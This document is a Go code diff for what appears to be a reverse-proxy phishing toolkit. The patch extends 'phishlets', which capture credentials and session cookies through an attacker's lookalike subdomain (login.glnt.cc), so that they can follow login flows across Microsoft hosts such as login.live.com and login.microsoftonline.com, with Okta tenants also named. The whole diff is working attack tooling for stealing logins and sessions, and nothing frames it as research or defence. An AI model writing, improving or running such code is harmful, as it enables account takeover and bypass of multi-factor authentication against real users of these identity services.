@@ -18,6 +18,11 @@ type Phishlet struct {
 	Upstream string `json:"upstream"`
 	Hostname string `json:"hostname"` // our subdomain, e.g. login.glnt.cc
 
+	// UpstreamHosts lists alternative upstream hosts this phishlet also handles.
+	// Useful when a login flow redirects across multiple hosts
+	// (e.g. login.live.com → login.microsoftonline.com).
+	UpstreamHosts []string `json:"upstream_hosts"`
+
 	ProxyPaths []string `json:"proxy_paths"`
 
 	CredentialFields struct {
@@ -67,21 +72,33 @@ func loadPhishlets() ([]Phishlet, error) {
 
 // matchPhishlet finds the phishlet whose upstream host suffix-matches the given URL.
 // For Okta (upstream: okta.com), this matches acme.okta.com, bigcorp.okta.com, etc.
+// Also checks UpstreamHosts for multi-host phishlets (e.g. login.live.com + login.microsoftonline.com).
 func matchPhishlet(phishlets []Phishlet, upstreamURL string) *Phishlet {
 	u, err := url.Parse(upstreamURL)
 	if err != nil {
 		return nil
 	}
 	for i := range phishlets {
-		pu, err := url.Parse(phishlets[i].Upstream)
-		if err != nil {
-			continue
-		}
-		if strings.EqualFold(u.Host, pu.Host) || strings.HasSuffix(strings.ToLower(u.Host), "."+strings.ToLower(pu.Host)) {
+		if hostMatchesHost(u.Host, phishlets[i].Upstream) {
 			return &phishlets[i]
+		}
+		for _, uh := range phishlets[i].UpstreamHosts {
+			if hostMatchesHost(u.Host, uh) {
+				return &phishlets[i]
+			}
 		}
 	}
 	return nil
+}
+
+// hostMatchesHost checks whether requestHost matches a phishlet host entry (which may be a full URL or bare hostname).
+func hostMatchesHost(requestHost, phishletHost string) bool {
+	// phishletHost may be a full URL; extract the host portion.
+	if u, err := url.Parse(phishletHost); err == nil && u.Host != "" {
+		phishletHost = u.Host
+	}
+	return strings.EqualFold(requestHost, phishletHost) ||
+		strings.HasSuffix(strings.ToLower(requestHost), "."+strings.ToLower(phishletHost))
 }
 
 // shouldProxy returns true if the request path should be proxied (matches a proxy_path prefix).
@@ -122,4 +139,18 @@ func (p *Phishlet) isSessionCookie(name string) bool {
 		}
 	}
 	return false
+}
+
+// allUpstreamHosts returns every host this phishlet handles (primary Upstream + UpstreamHosts).
+func (p *Phishlet) allUpstreamHosts() []string {
+	hosts := []string{}
+	if u, err := url.Parse(p.Upstream); err == nil && u.Host != "" {
+		hosts = append(hosts, u.Host)
+	}
+	for _, uh := range p.UpstreamHosts {
+		if u, err := url.Parse(uh); err == nil && u.Host != "" {
+			hosts = append(hosts, u.Host)
+		}
+	}
+	return hosts
 }
